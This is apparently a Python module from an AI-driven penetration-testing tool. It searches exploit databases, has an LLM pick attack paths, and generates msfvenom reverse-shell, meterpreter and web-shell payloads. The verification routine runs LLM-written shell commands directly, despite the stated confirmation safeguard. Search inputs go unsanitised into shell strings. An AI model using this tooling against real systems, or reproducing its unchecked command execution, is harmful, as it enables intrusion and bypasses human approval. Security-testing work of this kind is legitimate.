"""
RedClaw - Exploitation Agent
Vulnerability verification, exploit selection, payload generation
"""

from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum

from ..core.llm_client import RedClawLLM, Message
from ..tools.executor import ToolExecutor


class ExploitStatus(Enum):
    PENDING = "pending"
    VERIFIED = "verified"
    FAILED = "failed"
    SUCCESS = "success"


@dataclass
class Exploit:
    """Exploit information"""
    name: str
    cve: Optional[str]
    target_service: str
    target_version: str
    exploit_type: str  # remote, local, web, etc.
    risk_level: str  # low, medium, high, critical
    status: ExploitStatus = ExploitStatus.PENDING
    notes: str = ""


@dataclass
class ExploitResult:
    """Result of exploitation attempt"""
    exploit: Exploit
    success: bool
    output: str
    shell_obtained: bool = False
    privilege_level: str = "none"
    timestamp: datetime = field(default_factory=datetime.now)


class ExploitationAgent:
    """
    Exploitation Agent - Vulnerability exploitation
    
    Capabilities:
    - Exploit selection from CVE/service info
    - Metasploit integration
    - Searchsploit queries
    - Exploit verification
    - Payload generation
    
    SAFETY: Requires confirmation before exploitation
    """
    
    def __init__(
        self,
        llm: RedClawLLM,
        executor: ToolExecutor,
        auto_exploit: bool = False
    ):
        self.llm = llm
        self.executor = executor
        self.auto_exploit = auto_exploit
        self.exploits: List[Exploit] = []
        self.results: List[ExploitResult] = []
    
    async def search_exploits(self, service: str, version: str = "") -> List[Exploit]:
        """Search for exploits using searchsploit"""
        query = f"{service} {version}".strip()
        result = await self.executor.execute(f"searchsploit {query}")
        
        found_exploits = []
        for line in result.stdout.split('\n'):
            if '|' in line and 'exploits/' in line.lower():
                parts = line.split('|')
                if len(parts) >= 2:
                    name = parts[0].strip()
                    path = parts[1].strip()
                    
                    exploit = Exploit(
                        name=name,
                        cve=self._extract_cve(name),
                        target_service=service,
                        target_version=version,
                        exploit_type=self._classify_exploit(path),
                        risk_level="high"
                    )
                    found_exploits.append(exploit)
        
        self.exploits.extend(found_exploits)
        return found_exploits
    
    def _extract_cve(self, text: str) -> Optional[str]:
        """Extract CVE from text"""
        import re
        match = re.search(r'CVE-\d{4}-\d+', text, re.IGNORECASE)
        return match.group(0) if match else None
    
    def _classify_exploit(self, path: str) -> str:
        """Classify exploit type from path"""
        path_lower = path.lower()
        if 'remote' in path_lower:
            return 'remote'
        elif 'local' in path_lower:
            return 'local'
        elif 'webapps' in path_lower:
            return 'web'
        elif 'dos' in path_lower:
            return 'dos'
        return 'unknown'
    
    async def search_metasploit(self, query: str) -> List[Dict]:
        """Search Metasploit modules"""
        result = await self.executor.execute(
            f"msfconsole -q -x 'search {query}; exit' 2>/dev/null"
        )
        
        modules = []
        for line in result.stdout.split('\n'):
            if 'exploit/' in line or 'auxiliary/' in line:
                parts = line.split()
                if len(parts) >= 4:
                    modules.append({
                        "name": parts[0],
                        "rank": parts[2] if len(parts) > 2 else "normal",
                        "description": ' '.join(parts[3:]) if len(parts) > 3 else ""
                    })
        
        return modules
    
    async def analyze_exploits(
        self,
        services: List[Dict],
        vulnerabilities: List[str]
    ) -> str:
        """LLM analysis for exploit selection"""
        services_str = "\n".join([
            f"- {s.get('service', 'unknown')} on port {s.get('port', 'unknown')}"
            for s in services
        ])
        
        vulns_str = "\n".join(vulnerabilities[:10])
        
        exploits_str = "\n".join([
            f"- {e.name} (CVE: {e.cve or 'N/A'}, Type: {e.exploit_type})"
            for e in self.exploits[:10]
        ])
        
        messages = [
            Message(role="system", content="""You are a penetration testing expert.
Given the discovered services, vulnerabilities, and available exploits:
1. Recommend the best exploitation path
2. Prioritize by likelihood of success and impact
3. Identify any additional information needed
4. Suggest safe verification steps before exploitation

IMPORTANT: This is for authorized security testing only."""),
            Message(role="user", content=f"""
Services:
{services_str}

Known Vulnerabilities:
{vulns_str}

Available Exploits:
{exploits_str}

Recommend the exploitation strategy.
""")
        ]
        
        response = self.llm.chat(messages, max_tokens=1500)
        return response.content
    
    async def verify_vulnerability(
        self,
        target: str,
        vulnerability: str
    ) -> Dict[str, Any]:
        """Verify if vulnerability exists without exploitation"""
        messages = [
            Message(role="system", content="""Generate a safe verification command
to check if the vulnerability exists. DO NOT exploit, only verify.
Return the command in format: COMMAND: <command>"""),
            Message(role="user", content=f"Target: {target}\nVulnerability: {vulnerability}")
        ]
        
        response = self.llm.chat(messages, max_tokens=200)
        
        # Extract command
        if "COMMAND:" in response.content:
            cmd = response.content.split("COMMAND:")[1].strip().split('\n')[0]
            result = await self.executor.execute(cmd)
            return {
                "verified": "vulnerable" in result.stdout.lower() or result.return_code == 0,
                "command": cmd,
                "output": result.stdout[:500]
            }
        
        return {"verified": False, "error": "Could not generate verification command"}
    
    async def generate_payload(
        self,
        payload_type: str,
        lhost: str,
        lport: int,
        platform: str = "linux"
    ) -> str:
        """Generate payload using msfvenom"""
        payloads = {
            "reverse_shell": f"linux/x64/shell_reverse_tcp",
            "meterpreter": f"linux/x64/meterpreter/reverse_tcp",
            "web_shell": "php/meterpreter/reverse_tcp"
        }
        
        payload = payloads.get(payload_type, payloads["reverse_shell"])
        
        result = await self.executor.execute(
            f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f elf -o /tmp/payload"
        )
        
        return result.stdout
    
    async def run_exploit_analysis(
        self,
        target: str,
        services: List[Dict],
        vulnerabilities: List[str] = None
    ) -> Dict[str, Any]:
        """Complete exploitation analysis (without actual exploitation)"""
        # Search for exploits based on services
        for svc in services[:5]:
            service_name = svc.get('service', '')
            if service_name:
                await self.search_exploits(service_name)
        
        # Get LLM analysis
        analysis = await self.analyze_exploits(
            services,
            vulnerabilities or []
        )
        
        return {
            "target": target,
            "exploits_found": len(self.exploits),
            "exploits": [
                {
                    "name": e.name,
                    "cve": e.cve,
                    "type": e.exploit_type,
                    "risk": e.risk_level
                }
                for e in self.exploits[:10]
            ],
            "analysis": analysis,
            "requires_confirmation": True,
            "warning": "Exploitation requires explicit user confirmation"
        }
